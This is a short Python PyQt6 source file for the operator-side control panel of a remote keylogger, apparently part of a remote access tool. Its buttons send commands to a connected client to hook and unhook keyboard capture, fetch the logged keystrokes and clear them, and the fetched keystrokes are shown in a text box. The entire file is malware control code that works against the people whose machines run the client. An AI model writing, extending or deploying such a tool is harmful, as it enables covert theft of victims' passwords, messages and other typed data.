from keylogger_design import KeyloggerDesign
import global_variables as gv
import utils
from PyQt6.QtWidgets import QApplication
import sys

class KeyloggerApp(KeyloggerDesign):
    def __init__(self):
        super().__init__()

    def onButtonHookClick(self):
        utils.write(gv.client, "keylog_hook()")

    def onButtonUnhookClick(self):
        utils.write(gv.client, "keylog_unhook()")

    def onButtonPrintKeyClick(self):
        utils.write(gv.client, "keylog_print()")

        self.txtOutput.setText(utils.read_str(gv.client))

    def onButtonClearClick(self):
        utils.write(gv.client, "keylog_clear()")

        self.txtOutput.setText("")

    def closeEvent(self, event):
        self.onButtonUnhookClick()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogger_app = KeyloggerApp()
    keylogger_app.show()
    sys.exit(app.exec())
